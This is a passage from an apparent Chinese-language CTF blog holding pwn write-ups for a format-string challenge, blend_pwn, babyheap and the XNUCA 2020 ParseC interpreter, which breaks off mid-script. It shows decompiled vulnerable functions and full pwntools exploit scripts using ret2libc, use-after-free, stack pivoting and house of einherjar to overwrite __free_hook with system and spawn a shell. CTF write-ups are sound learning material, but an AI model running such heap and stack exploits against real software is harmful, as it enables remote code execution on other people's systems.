&quot;%1$00556s%3$hn%1$64980s%1$57344s%1$00016s%7$hn&quot;, 0x2FuLL);  memcpy((char *)dest + 556, &quot;%1$00593s%3$hn%1$64943s%1$*5$s%13$hn&quot;, 0x25uLL);  memcpy((char *)dest + 593, &quot;%1$00645s%3$hn%1$64891s%1$57344s%1$00048s%7$hn&quot;, 0x2FuLL);  memcpy((char *)dest + 645, &quot;%1$00690s%3$hn%1$64846s%1$*5$s%1$*12$s%13$hn&quot;, 0x2DuLL);  memcpy((char *)dest + 690, &quot;%1$00737s%3$hn%1$64799s%1$*12$s%1$65424s%13$hn&quot;, 0x2FuLL);  memcpy((char *)dest + 737, &quot;%12$c%1$01360s%2$c%4$s%1$64948s%3$hn&quot;, 0x25uLL);  memcpy((char *)dest + 774, &quot;%1$00821s%3$hn%1$64715s%1$57344s%1$00024s%7$hn&quot;, 0x2FuLL);  memcpy((char *)dest + 821, &quot;%1$00858s%3$hn%1$64678s%1$*5$s%15$hn&quot;, 0x25uLL);  memcpy((char *)dest + 858, &quot;%1$00905s%3$hn%1$64631s%1$57344s%1$00120s%7$hn&quot;, 0x2FuLL);  memcpy((char *)dest + 905, &quot;%1$00950s%3$hn%1$64586s%1$*5$s%1$*14$s%15$hn&quot;, 0x2DuLL);  memcpy((char *)dest + 950, &quot;%1$00997s%3$hn%1$64539s%1$*14$s%1$65424s%15$hn&quot;, 0x2FuLL);  memcpy((char *)dest + 997, &quot;%14$c%1$01097s%2$c%4$s%1$65474s%3$hn&quot;, 0x25uLL);  memcpy((char *)dest + 1037, &quot;%1$01084s%3$hn%1$64452s%1$57344s%1$00032s%7$hn&quot;, 0x2FuLL);  memcpy((char *)dest + 1084, &quot;%1$01121s%3$hn%1$64415s%1$*5$s%17$hn&quot;, 0x25uLL);  memcpy((char *)dest + 1121, &quot;%1$01168s%3$hn%1$64368s%1$57344s%1$00112s%7$hn&quot;, 0x2FuLL);  memcpy((char *)dest + 1168, &quot;%1$01215s%3$hn%1$64321s%1$*5$s%1$*16$s%17$hn&quot;, 0x2DuLL);  memcpy((char *)dest + 1215, &quot;%1$01262s%3$hn%1$64274s%1$*16$s%1$65415s%17$hn&quot;, 0x2FuLL);  memcpy((char *)dest + 1262, &quot;%16$c%1$00835s%2$c%4$s%1$00462s%3$hn&quot;, 0x25uLL);  memcpy((char *)dest + 1299, &quot;%1$01346s%3$hn%1$64190s%1$57344s%1$00040s%7$hn&quot;, 0x2FuLL);  memcpy((char *)dest + 1346, &quot;%1$01383s%3$hn%1$64153s%1$*5$s%19$hn&quot;, 0x25uLL);  memcpy((char *)dest + 1383, &quot;%1$01430s%3$hn%1$64106s%1$57344s%1$00056s%7$hn&quot;, 0x2FuLL);  memcpy((char *)dest + 1430, &quot;%1$01475s%3$hn%1$64061s%1$*5$s%1$*18$s%19$hn&quot;, 0x2DuLL);  memcpy((char *)dest + 1475, &quot;%1$01522s%3$hn%1$64014s%1$*18$s%1$65424s%19$hn&quot;, 0x2FuLL);  memcpy((char *)dest + 1522, &quot;%18$c%1$00575s%2$c%4$s%1$00982s%3$hn&quot;, 0x25uLL);  memcpy((char *)dest + 1559, &quot;%1$01606s%3$hn%1$63930s%1$57344s%1$00072s%7$hn&quot;, 0x2FuLL);  memcpy((char *)dest + 1606, &quot;%1$01643s%3$hn%1$63893s%1$*5$s%21$hn&quot;, 0x25uLL);  memcpy((char *)dest + 1643, &quot;%1$01690s%3$hn%1$63846s%1$57344s%1$00088s%7$hn&quot;, 0x2FuLL);  memcpy((char *)dest + 1690, &quot;%1$01735s%3$hn%1$63801s%1$*5$s%1$*20$s%21$hn&quot;, 0x2DuLL);  memcpy((char *)dest + 1735, &quot;%1$01782s%3$hn%1$63754s%1$*20$s%1$65417s%21$hn&quot;, 0x2FuLL);  memcpy((char *)dest + 1782, &quot;%20$c%1$00315s%2$c%4$s%1$01502s%3$hn&quot;, 0x25uLL);  memcpy((char *)dest + 1819, &quot;%1$01866s%3$hn%1$63670s%1$57344s%1$00080s%7$hn&quot;, 0x2FuLL);  memcpy((char *)dest + 1866, &quot;%1$01906s%3$hn%1$63630s%1$*5$s%23$hn&quot;, 0x25uLL);  memcpy((char *)dest + 1906, &quot;%1$01953s%3$hn%1$63583s%1$57344s%1$00104s%7$hn&quot;, 0x2FuLL);  memcpy((char *)dest + 1953, &quot;%1$01998s%3$hn%1$63538s%1$*5$s%1$*22$s%23$hn&quot;, 0x2DuLL);  memcpy((char *)dest + 1998, &quot;%1$02045s%3$hn%1$63491s%1$*22$s%1$65426s%23$hn&quot;, 0x2FuLL);  memcpy((char *)dest + 2045, &quot;%22$c%1$00052s%2$c%4$s%1$02028s%3$hn&quot;, 0x25uLL);  memcpy((char *)dest + 2082, &quot;%1$02120s%3$hn%1$63416s%1$00032s%6$hn&quot;, 0x26uLL);  memcpy((char *)dest + 2120, &quot;%1$65534s%3$hn&quot;, 0xFuLL);  memcpy((char *)dest + 2135, &quot;%8$c%1$00525s%2$c%4$s%1$01644s%3$hn&quot;, 0x24uLL);  memcpy((char *)dest + 2171, &quot;%1$02209s%3$hn%1$63327s%1$00004s%6$hn&quot;, 0x26uLL);  memcpy((char *)dest + 2209, &quot;%10$c%1$00450s%2$c%4$s%1$01794s%3$hn&quot;, 0x25uLL);  memcpy((char *)dest + 2246, &quot;%1$02284s%3$hn%1$63252s%1$00004s%6$hn&quot;, 0x26uLL);  memcpy((char *)dest + 2284, &quot;%12$c%1$00374s%2$c%4$s%1$01946s%3$hn&quot;, 0x25uLL);  memcpy((char *)dest + 2322, &quot;%1$02360s%3$hn%1$63176s%1$00004s%6$hn&quot;, 0x26uLL);  memcpy((char *)dest + 2360, &quot;%14$c%1$00299s%2$c%4$s%1$02096s%3$hn&quot;, 0x25uLL);  memcpy((char *)dest + 2397, &quot;%1$02435s%3$hn%1$63101s%1$00004s%6$hn&quot;, 0x26uLL);  memcpy((char *)dest + 2435, &quot;%16$c%1$00224s%2$c%4$s%1$02246s%3$hn&quot;, 0x25uLL);  memcpy((char *)dest + 2472, &quot;%1$02510s%3$hn%1$63026s%1$00004s%6$hn&quot;, 0x26uLL);  memcpy((char *)dest + 2510, &quot;%18$c%1$00149s%2$c%4$s%1$02396s%3$hn&quot;, 0x25uLL);  memcpy((char *)dest + 2547, &quot;%1$02585s%3$hn%1$62951s%1$00004s%6$hn&quot;, 0x26uLL);  memcpy((char *)dest + 2585, &quot;%20$c%1$00074s%2$c%4$s%1$02546s%3$hn&quot;, 0x25uLL);  memcpy((char *)dest + 2622, &quot;%1$02660s%3$hn%1$62876s%1$00004s%6$hn&quot;, 0x26uLL);  memcpy((char *)dest + 2660, &quot;%22$c%1$65535s%2$c%4$s%1$02696s%3$hn&quot;, 0x25uLL);  memcpy((char *)dest + 2697, &quot;%1$65534s%3$hn&quot;, 0xFuLL);  v11 = 0LL;  v10 = 0LL;  v9 = 0LL;  v8 = 0LL;  v7 = 0LL;  v6 = 0LL;  v5 = 0LL;  v4 = 0LL;  format = (char *)dest;  vul_size = (unsigned __int16 *)dest;  puts(&quot;What the f**k printf?\\n&quot;);  puts(&quot;Try to input something&quot;);  puts(&quot;You will find this game very interesting&quot;);  for ( i = 0; i &lt;= 15; ++i )                   // input 16 times    __isoc99_scanf(&quot;%d&quot;, (char *)dest + 8 * i + 57344);  v16 = 0;  while ( (char *)dest + 65534 != format )  &#123;    sprintf(      (char *)0x6000000,      format,      &amp;v13,      0LL,      &amp;format,      100663296LL,      *vul_size,      vul_size,      &amp;vul_size,      v11,      &amp;v11,      v10,      &amp;v10,      v9,      &amp;v9,      v8,      &amp;v8,      v7,      &amp;v7,      v6,      &amp;v6,      v5,      &amp;v5,      v4,      &amp;v4);    ++v16;  &#125;  if ( *vul_size &lt;= 0x20u )    read_vul(*vul_size);  else    puts(&quot;Please try again and you will get it&quot;);  puts(&quot;Sorry you are out&quot;);  return 0LL;&#125;\n\n一堆格式化字符串，输入一些数值, 会取出相应的字符串来进行格式化处理，在处理完之后，调用输入函数，输入函数如下。\nssize_t __fastcall read_vul(unsigned __int16 a1)&#123;  __int64 savedregs; // [rsp+10h] [rbp+0h]  return read(0, &amp;savedregs, 2 * a1);           // vul&#125;\n\n在进行第9次输入的时候，输入的值直接可修改size变量，修改为大于0x5的即可实现堆栈溢出，直接采用ret2libc打法。\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0gan# Env: Linux arch 5.8.14-arch1-1from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;pwn_printf&#x27;libc_path = &#x27;./libc.so.6&#x27;# remote server ip and portserver_ip = &quot;47.111.96.55&quot;server_port = 54506# if local debugLOCAL = 0LIBC  = 0#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tfor _ in range(8):\t\tsl(&#x27;0&#x27;)\tsl(str(0x20)) # set size\tfor _ in range(7):\t\tsl(&#x27;0&#x27;)\tpop_rdi = 0x401213\tstart = 0x4007EF\tvul_read = 0x4007C6\tp = p64(0) # rbp\tp += p64(pop_rdi)\tp += p64(elf.got[&#x27;read&#x27;])\tp += p64(elf.plt[&#x27;puts&#x27;])\tp += p64(pop_rdi)\tp += p64(0x40)\tp += p64(vul_read)\ts(p)\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)\tlibc_base = leak - 0x0f7310\tli(&#x27;libc_base: &#x27; + hex(libc_base))\tdb()\tp = p64(0)\tp += p64(pop_rdi)\tp += p64(libc_base + 0x18ce17)\tp += p64(libc_base + 0x0453a0)\ts(p)\tdef finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process()\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\n\n\n\n\npwn2  [blend_pwn]该程序漏洞比较多，需要各个漏洞结合起来打。\nvul1字符串漏洞\nint show_user()&#123;  return printf(byte_202080);                   // vul&#125;\n\n\n\nvul2uaf漏洞，释放内存后指针没有清0\n__int64 del()&#123;  int index; // [rsp+Ch] [rbp-4h]  printf(&quot;index&gt;&quot;);  index = input_n();  if ( index &lt; 0 || index &gt; 1 )  &#123;    puts(&quot;Insufficient space&quot;);    exit(0);  &#125;  if ( ptr_arr[index] )  &#123;    free((void *)ptr_arr[index]);    puts(&quot;down!&quot;);  &#125;  else  &#123;    puts(&quot;fail!&quot;);  &#125;  return 0LL;&#125;\n\n\n\nvul3堆栈溢出可修改rbp，在捕获异常后可实现堆栈迁移。\nunsigned __int64 gift()&#123;  _QWORD *v0; // rax  char v2; // [rsp+10h] [rbp-20h] vul  unsigned __int64 v3; // [rsp+28h] [rbp-8h]  v3 = __readfsqword(0x28u);  printf(&quot;Please input what you want:&quot;);  if ( (signed int)readn(&amp;v2, 0x28) &gt; 0x10 )  &#123;    v0 = (_QWORD *)_cxa_allocate_exception(8LL);    *v0 = &quot;You are too young!&quot;;    _cxa_throw((__int64)v0, (__int64)&amp;`typeinfo for&#x27;char const*, 0LL);  &#125;  return __readfsqword(0x28u) ^ v3;&#125;\n\n\n\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0gan# Env: Linux arch 5.8.14-arch1-1from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;blend_pwn&#x27;libc_path = &#x27;./libc.so.6&#x27;libs_path = &#x27;~/pwn-lib/2.23&#x27;# remote server ip and portserver_ip = &quot;47.111.96.55&quot;server_port = 52704# if local debugLOCAL = 1LIBC  = 0#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def shu():\tsla(&#x27;&gt;&#x27;, &#x27;1&#x27;)\tdef ad(d):\tsla(&#x27;&gt;&#x27;, &#x27;2&#x27;)\tsla(&#x27;:&#x27;, d)def rm(i):\tsla(&#x27;&gt;&#x27;, &#x27;3&#x27;)\tsla(&#x27;&gt;&#x27;, str(i))def dp():\tsla(&#x27;&gt;&#x27;, &#x27;4&#x27;)def gift(d):\tsla(&#x27;&gt;&#x27;, &#x27;666&#x27;)\tsla(&#x27;want:&#x27;, d)\t#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tdp()\tsla(&#x27;:&#x27;, &#x27;%p%p&#x27;)\tshu()\tru(&#x27;0x&#x27;)\tleak = int(r(12), 16)\tli(&#x27;leak: &#x27; + hex(leak))\tru(&#x27;0x&#x27;)\tleak = int(r(12), 16)\tlibc_base = leak - 0x3c6780\tli(&#x27;libc_base: &#x27; + hex(libc_base))\tone_gadget = libc_base + 0x45226\tp = p64(0) * 3\tp += p64(one_gadget)\tad(p)\tad(&#x27;A&#x27;)\trm(0)\trm(1)\t# leak heap\tru(&#x27;\\n&#x27;)\theap_leak = u64(ru(&#x27;\\n&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))\tli(&#x27;leak: &#x27; + hex(heap_leak))\t\tp = b&#x27;A&#x27; * 0x20\tp += p64(heap_leak + 0x20)\tp += b&#x27;A&#x27; * 0x9\tgift(p)def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path, &quot;LD_PRELOAD&quot;:libc_path&#125;)\t\telse:\t\t\tio = elf.process()\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\n\n\npwn3 [babyheap]保护\nArch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled\n\n\n\nvuloff by null漏洞\nchar *__fastcall safe_read(char *a1, int a2)&#123;  char *result; // rax  read(0, a1, 0xF0uLL);  result = &amp;a1[a2];  *result = 0;                                  // off by null  return result;&#125;\n\n\n\n思路这个题只要实现堆重叠即可任意地址开辟写入，采用house of einherjar 来实现，但是需要伪造堆块，绕过unlink检查，修改free_hook为system函数。\n#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0gan# Env: Linux arch 5.8.14-arch1-1from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li  = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;pwn&#x27;MODIFY_LD = 0arch = &#x27;64&#x27;libc_v = &#x27;2.27&#x27;ld_path   = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/ld-linux-x86-64.so.2&#x27;libs_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib&#x27;libc_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# change ld path if(MODIFY_LD):\tos.system(&#x27;cp &#x27; + elf_path + &#x27; &#x27; + elf_path + &#x27;.bk&#x27;)\tchange_ld_cmd = &#x27;patchelf  --set-interpreter &#x27; + ld_path +&#x27; &#x27; + elf_path\tos.system(change_ld_cmd)\tli(&#x27;modify ld ok!&#x27;)\texit(0)# remote server ip and portserver_ip = &quot;47.111.104.99&quot;server_port = 52403# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def ad():\tsla(&#x27;&gt;&gt;&#x27;, &#x27;1&#x27;)def dp(idx):\tsla(&#x27;&gt;&gt;&#x27;, &#x27;2&#x27;)\tsla(&#x27;?&#x27;, str(idx))def md(i, s, d):\tsla(&#x27;&gt;&gt;&#x27;, &#x27;3&#x27;)\tsla(&#x27;?&#x27;, str(i))\tsla(&#x27;:&#x27;, str(s))\tsa(&#x27;:&#x27;, d)def rm(i):\t\tsla(&#x27;&gt;&gt;&#x27;, &#x27;4&#x27;)\tsla(&#x27;?&#x27;, str(i))\tdef q():\tsla(&#x27;&gt;&gt;&#x27;, &#x27;5&#x27;)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tad()\tad()\tmd(0, 0xF8, &#x27;A&#x27; * 0xF8)\tmd(0, 0xF8, &#x27;A&#x27; * 0xF8)\trm(0)\trm(1)\tad()\tdp(0)\t# leak heap\tru(&#x27;\\n&#x27;)\tleak = u64(ru(&#x27;\\nD&#x27;).ljust(8, b&#x27;\\x00&#x27;))\theap_base = leak - 0x260\tli(&#x27;heap_base : &#x27; + hex(heap_base))\trm(0)\t# leak libc\tfor _ in range(10):\t\tad()\tfor i in range(10):\t\trm(i)\tfor _ in range(10):\t\tad()\tdp(7)\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)\tmain_arena = 0x3afc40\tmain_arena = 0x3ebc40\tlibc_base = leak - main_arena - 96\tfree_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]\tsystem = libc_base + libc.sym[&#x27;system&#x27;]\tli(&#x27;libc_base: &#x27; + hex(libc_base))\tfor i in range(7):\t\tmd(i, 10, &#x27;\\x00&#x27; * 8 + str(i))\t\trm(i)\toverlap = heap_base + 0xa50\t#rm(7)\t# passby unlink\tmd(7, 0xf8, p64(heap_base + 0xb50) + p64(heap_base + 0xb50)) # merge to this\tmd(8, 0x10, &#x27;BBBB&#x27;)\tp = p64(heap_base + 0x950)\tp += p64(heap_base + 0x950)\tmd(9, 0x10, p)\trm(8) # house of einherjar\tfor _ in range(7):\t\tad()\tad() # index 7\tmd(7, 0x10, &#x27;AA&#x27;)\trm(7)\tmd(8, 0x10, p64(free_hook))\tad() # index 9\tad() # index 10\tmd(10, 0x10, p64(system))\t\tmd(9, 0x10, &#x27;/bin/sh\\x00&#x27;)\t#db()\trm(9)def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path, &quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path&#125; )\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n","categories":["ctf"],"tags":["pwn"]},{"title":"2020 XNUCA CTF Pwn Wp","url":"/2020/10/31/security/ctf/compitation/wp-xnuca-2020/","content":"XNUCA WP前言这一次比赛虽然只做出了一道pwn,但是感觉收获不错，只够交wp的资格了，线下可能就比较悬。也白票出题人的代码是咋写的^_^，以前也是好奇在获得shell之后是如何实现输入token的。\n还有以前也想学一下解释器是怎么实现的, 这次比赛pwn parsec出了个语言解释器, 也给了对应的源码, 源码不是很多, 但是非常精小而强悍。晚上利用该漏洞调试至凌晨4点，第二天才发现原来调试的一直是debug模式的解释器，不得不重新改改heap的偏移,然后后面打远程打不通…泄漏远程heap时，发现远程偏移比本地小0x410，这里卡了好久，，，tcl。下次比赛好好加油!!!\nParseC给了源码\n下载\n这个题比较有意思, 用被解释的语言写exp。下面是这个解释器实例代码\n// Fibonacci sequencefunc fun&#123; \tif(x &lt;= 2)&#123;  \t\treturn(1);  \t&#125;\ty = 0;\tx = x - 1;\ty = fun(x);\tx = x - 1;\treturn(y + fun(x));&#125;;// save the Fibonacci sequence of 1 to 15 in an array array arr(15);\tx = 1;while( x &lt;= 15 )&#123;\tarr[x - 1] = fun(x);\tx = 1 + x;&#125;puts(&quot;Fibonacci sequence:&quot;);// print the Fibonacci sequence of 1 to 15i = 0;while(i &lt; 15)&#123;\t\t\t\tprint(arr[i]);\ti=i+1;&#125;\n\n\n\nvul数组越接访问,但不可赋值\n类型混淆\n字符串赋值直接赋值指针变量, 还有free时没有对指针进行清0, 导致uaf漏洞\nelse if (token == Sym || token == ArraySym || token == StrSym) &#123;        symbol* s = token_val.ptr;        int tktype = token;        int index;        match(tktype);        if (tktype == ArraySym) &#123;            match(&#x27;[&#x27;);            index = expression();            match(&#x27;]&#x27;);            match(&#x27;=&#x27;);            if (index &gt;= 0 &amp;&amp; index &lt; s-&gt;value) &#123;                s-&gt;pointer.list[index].value = expression();            &#125;            else&#123;                printf(&quot;line %.*s: Index out of range\\n&quot;,(int)(src - old_src), old_src);                exit(-1);            &#125;        &#125;        else &#123;            match(&#x27;=&#x27;);            if (token == Str) &#123;                if (s-&gt;pointer.funcp)                    free(s-&gt;pointer.funcp); // not set ptr as null, uaf vul                s-&gt;pointer.funcp = (char*)token_val.ptr;                s-&gt;type = StrSym;                match(Str);            &#125;            else if (token == Char) &#123;                s-&gt;value = token_val.val;                s-&gt;type = Char;                match(Char);            &#125;            else if (token == StrSym)&#123;                s-&gt;type = token_val.ptr-&gt;type;                s-&gt;value = token_val.ptr-&gt;value;                s-&gt;pointer = token_val.ptr-&gt;pointer;                match(StrSym);            &#125;            else&#123;                s-&gt;value = expression();                s-&gt;type = Num;            &#125;        &#125;        match(&#x27;;&#x27;);    &#125;\n\n\n\n思路开始前期, 我还以为可以利用类型混淆来实现任意读写, 由于程序是有pie的, 不能直接静态执行脚本实现任意地址读和写。\n数组与字符串是储存在堆里的, 原本打算是通过数组来泄漏libc, 后面发现行不通, 以double方式打印, 某些不符合double类型储存规范的, 直接为0。然而后面发现puts打印字符串可以泄漏libc, 采用字符串uaf漏洞+ 数组方式来进行修改释放后chunk的fd实现任意地址开辟, 这里需要精心的伪造.还有该解释器中定义的变量都是以double类型储存的, 在进行修改为值为地址时, 输入值为double类型的字符串, 需要进行一些转换。单个数组元素大小为0x40，实现修改的只能是采用数组来实现修改了， 那如何实现数组任意地址写入呢?就需要解释器中的字符串uaf漏洞进行修改fd, 采用partial write实现修改tcahe bin 0x51中的fd, 采用一次数组输入实现修改fd, 指向的内存, 后一次则是修改该内存的值。 修改__free_hook为system, free时传入’bin&#x2F;sh;’ 即可。坑: 本地打通, 远程打不通，远程中堆中不存在0x410的缓冲chunk。本地却存在，在打远程时，先开辟0x400大小的堆，以保证本地与远程的heap偏移一致。\n脚本执行expfunc write_to_target &#123;\tunuse = &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;\tarray arr(1);\tarr[0] = 1;\tx = &quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;;\ty = x;\tz = x;\tx = &quot;free----&quot;; \ty = &quot;free------&quot;;\tz = &quot;free---------&quot;;\tputs(&quot;AAAAAAAA&quot;);\tz = x;\tx = &quot;12---------------&quot;; // free x\tx = z;\tx = &quot;12345454AAAAAAA--------------&quot;; // free z\tx = z;\tx = &quot;/bin/sh;aasfasdfjasdfklajsdfjasdjff&quot;; //free x \tu = &quot;p&quot;; // modify chunk fd to 0x50 chunk for modify fd\ta = &quot;malloc&quot;;\tb = &quot;H&quot;; // modify chunk fd to arr value\tarr[0] = 0;\tn = 0;\tread(n); // input target addr to modify\tarr[0] = n;\tarray arr_2(1); // align\tarray arr_3(1); // align\tputs(&quot;malloc target chunk&quot;);\tarray arr_mod(1); // modify target as one_gadget\tarr_mod[0] = 0;\tnn = 0;\tread(nn);\tarr_mod[0] = nn;\tx = &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;\tx = &quot;------------------------------------get_shell--------------------------------------&quot;;\tx = &quot;getshelll&quot;;&#125;;func leak_libc &#123;    // remote heap buffer for align heap offset\tr = &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;\tx = &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA